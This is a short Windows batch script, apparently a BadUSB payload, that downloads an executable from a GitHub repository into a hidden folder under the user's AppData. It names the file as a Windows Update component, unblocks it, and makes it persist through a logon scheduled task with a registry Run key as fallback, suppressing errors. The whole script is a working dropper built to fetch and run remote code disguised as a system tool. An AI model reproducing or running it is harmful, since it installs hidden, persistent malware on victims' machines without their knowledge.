@echo off
set TEMP_PATH=%APPDATA%\Microsoft\Windows\Update
mkdir "%TEMP_PATH%" >nul 2>&1

REM Download EXE
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/DarknesGX/badusbflips/main/WindowsUpdateValidator.exe -OutFile '%TEMP_PATH%\WindowsUpdateValidator.exe'"

REM Unblock EXE
powershell -Command "Unblock-File -Path '%TEMP_PATH%\WindowsUpdateValidator.exe'"

REM Create scheduled task using current user (non-admin)
schtasks /create /tn "Windows Update Validator" /tr "\"%TEMP_PATH%\WindowsUpdateValidator.exe\"" /sc onlogon /rl LIMITED >nul 2>&1

REM Fallback: if schtasks fails, use registry-based persistence (user-level)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdateValid" /t REG_SZ /d "\"%TEMP_PATH%\WindowsUpdateValidator.exe\"" /f